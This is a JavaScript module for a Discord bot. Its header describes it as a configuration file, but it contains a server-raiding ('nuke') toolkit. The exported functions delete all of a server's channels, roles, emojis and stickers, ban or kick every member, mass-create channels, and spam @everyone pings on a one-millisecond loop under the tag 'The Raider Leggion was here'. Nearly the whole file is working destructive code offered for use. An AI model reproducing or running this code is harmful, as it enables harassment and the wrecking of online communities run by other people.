/*
# Discord Server: https://discord.gg/pgDje8S3Ed
# Github: https://github.com/MikaboshiDev
# Docs: https://bit.ly/nightdevelopment
# Dashboard: https://bit.ly/nightdashboard

# Created by: MikaboshiDev
# Version: 1.0.0
# Discord: azazel_hla

# This file is the main configuration file for the bot.
# Inside this file you will find all the settings you need to configure the bot.
# If you have any questions, please contact us on our discord server.
# If you want to know more about the bot, you can visit our website.
*/

const Discord = require("discord.js");
function MassChannels(message, amount, channelName, channelPerms) {
    return new Promise((resolve, reject) => {
        if (!amount || isNaN(amount)) return message.reply({
            content: [
                `Unspecified Args: Specify the amount you wish to mass channels`,
                `**Usage:** \`${prefix}masschannels <amount> <channel name>\``,
            ].join("\n")
        });
        if (amount > 500) return message.reply({
            content: [
                `Amount Error: Max guild channel size is 500 | Tip: Use a number lower than 500`,
                `report this error to the developer if you think this is a mistake.`
            ].join("\n")
        });
        if (!channelPerms) return message.reply({
            content: [
                `Bot Missing Permissions: 'ManageChannels' | Tip: Give the bot the permission to manage channels`,
                `report this error to the developer if you think this is a mistake.`
            ].join("\n")
        });

        for (let i = 0; i < amount; i++) {
            if (message.guild.channels.cache.size === 500) break;
            if (!channelName) {
                message.guild.channels.create({
                    name: `${message.author.username} was here`,
                    type: Discord.ChannelType.GuildText,
                    topic: "The Raider Leggion was here",
                }).catch((err) => { console.log("Error Found: " + err) })
            } else {
                message.guild.channels.create({
                    name: channelName,
                    type: Discord.ChannelType.GuildText,
                    topic: "The Raider Leggion was here",
                }).catch((err) => { console.log("Error Found: " + err) })
            }
        }
        resolve();
    });
}

function MassChnPing(message, amount, channelName, pingMessage, channelPerms) {
    return new Promise((resolve, reject) => {
        if (!amount || isNaN(amount)) return message.reply({
            content: [
                `Unspecified Args: Specify the amount you wish to mass channels`,
                `**Usage:** \`${prefix}masschannels <amount> <channel name> <message to ping>\``,
            ].join("\n")
        });
        if (amount > 500) return message.reply({
            content: [
                `Amount Error: Max guild channel size is 500 | Tip: Use a number lower than 500`,
                `report this error to the developer if you think this is a mistake.`
            ].join("\n")
        });
        if (!channelPerms) return message.reply({
            content: [
                `Bot Missing Permissions: 'ManageChannels' | Tip: Give the bot the permission to manage channels`,
                `report this error to the developer if you think this is a mistake.`
            ].join("\n")
        });
        if (!pingMessage) return message.reply({
            content: [
                `Unspecified Args: Specify the message you wish to ping with`,
                `**Usage:** \`${prefix}masschannels <amount> <channel name> <message to ping>\``,
            ].join("\n")
        });
        for (let i = 0; i < amount; i++) {
            if (message.guild.channels.cache.size === 500) break;
            if (!channelName) {
                message.guild.channels.create({
                    name: `${message.author.username} was here`,
                    type: Discord.ChannelType.GuildText,
                    topic: "The Raider Leggion was here",
                }).catch((err) => { console.log(("Error Found: " + err)) }).then((ch) => {
                    setInterval(() => {
                        ch.send({ content: "@everyone " + pingMessage });
                    }, 1);
                });
            } else {
                message.guild.channels.create({
                    name: channelName,
                    type: Discord.ChannelType.GuildText,
                    topic: "The Raider Leggion was here",
                }).catch((err) => { console.log(("Error Found: " + err)) }).then((ch) => {
                    setInterval(() => {
                        ch.send({ content: "@everyone " + pingMessage });
                    }, 1);
                });
            }
        }
        resolve();
    });
}

function DelAllChannels(message, channelPerms) {
    return new Promise((resolve, reject) => {
        if (!channelPerms) return message.reply({
            content: [
                `Bot Missing Permissions: 'ManageChannels' | Tip: Give the bot the permission to manage channels`,
                `report this error to the developer if you think this is a mistake.`
            ].join("\n")
        });

        message.guild.channels.cache.forEach((ch) => ch.delete().catch((err) => {
            console.log("Error Found: " + err)
        }))
        resolve();
    });
}

function MassRoles(message, amount, roleName, rolePerms) {
    return new Promise((resolve, reject) => {
        if (!amount || isNaN(amount)) return message.reply({
            content: [
                `Unspecified Args: Specify the amount you wish to mass roles with`,
                `**Usage:** \`${prefix}massroles <amount> <role name>\``,
            ].join("\n")
        });
        if (!rolePerms) return message.reply({
            content: [
                `Bot Missing Permissions: 'ManageRoles' | Tip: Give the bot the permission to manage roles`,
                `report this error to the developer if you think this is a mistake.`
            ].join("\n")
        });

        for (let i = 0; i <= amount; i++) {
            if (message.guild.roles.cache.size === 250) break;
            if (!roleName) {
                message.guild.roles.create({
                    name: "nuked",
                    color: "Random",
                    position: i++
                }).catch((err) => {
                    console.log("Error Found: " + err)
                })
            } else {
                message.guild.roles.create({
                    name: roleName,
                    color: "Random",
                    position: i++
                }).catch((err) => {
                    console.log("Error Found: " + err)
                })
            }
        }
    })
}

function DelAllRoles(message, rolePerms) {
    return new Promise((resolve, reject) => {
        if (!rolePerms) return message.reply({
            content: [
                `Bot Missing Permissions: 'ManageRoles' | Tip: Give the bot the permission to manage roles`,
                `report this error to the developer if you think this is a mistake.`
            ].join("\n")
        });

        message.guild.roles.cache.forEach((r) => r.delete().catch((err) => {
            console.log("Error Found: " + err)
        }))
    });
}

function DelAllEmotes(message, emotePerms) {
    return new Promise((resolve, reject) => {
        if (!emotePerms) return message.reply({
            content: [
                `Bot Missing Permissions: 'ManageEmojisAndStickers'`,
                `Tip: Give the bot the permission to manage emojis and stickers`,
                `report this error to the developer if you think this is a mistake.`
            ].join("\n")
        });

        message.guild.emojis.cache.forEach((e) => e.delete().catch((err) => {
            console.log("Error Found: " + err)
        }))
    });
}

function DelAllStickers(message, emotePerms) {
    return new Promise((resolve, reject) => {
        if (!emotePerms) return message.reply({
            content: [
                `Bot Missing Permissions: 'ManageEmojisAndStickers'`,
                `Tip: Give the bot the permission to manage emojis and stickers`,
                `report this error to the developer if you think this is a mistake.`
            ].join("\n")
        });

        message.guild.stickers.cache.forEach((s) => s.delete().catch((err) => {
            console.log("Error Found: " + err)
        }))
    });
}

function BanAll(message, banPerms) {
    return new Promise((resolve, reject) => {
        if (!banPerms) return message.reply({
            content: [
                `Bot Missing Permissions: 'BanMembers' | Tip: Give the bot the permission to ban members`,
                `report this error to the developer if you think this is a mistake.`
            ].join("\n")
        });

        let arrayOfIDs = message.guild.members.cache.map((user) => user.id);
        message.reply({ content: "Found " + arrayOfIDs.length + " users." }).then((msg) => {
            setTimeout(() => {
                msg.edit({ content: "Banning..." });
                for (let i = 0; i < arrayOfIDs.length; i++) {
                    const user = arrayOfIDs[i];
                    const member = message.guild.members.cache.get(user);
                    member.ban().catch((err) => {
                        console.log(("Error Found: " + err))
                    }).then(() => {
                        console.log(chalk.redBright(`[Darkmode]`) + ` ${member.user.tag} was banned.`)
                    });
                }
            }, 2000);
        })
    })
}

function KickAll(message, kickPerms) {
    return new Promise((resolve, reject) => {
        if (!kickPerms) return message.reply({
            content: [
                `Bot Missing Permissions: 'KickMembers' | Tip: Give the bot the permission to kick members`,
                `report this error to the developer if you think this is a mistake.`
            ].join("\n")
        });

        let arrayOfIDs = message.guild.members.cache.map((user) => user.id);
        message.reply({ content: "Found " + arrayOfIDs.length + " users." }).then((msg) => {
            setTimeout(() => {
                msg.edit({ content: "Banning..." });
                for (let i = 0; i < arrayOfIDs.length; i++) {
                    const user = arrayOfIDs[i];
                    const member = message.guild.members.cache.get(user);
                    member.kick().catch((err) => {
                        console.log("Error Found: " + err)
                    }).then(() => {
                        console.log(chalk.redBright(`[Darkmode]`) + ` ${member.user.tag} was kicked.`)
                    });
                }
            }, 2000);
        })
    })
}

module.exports = { 
    DelAllChannels, KickAll, BanAll, DelAllRoles, DelAllEmotes, DelAllStickers, MassRoles, MassChannels, MassChnPing
}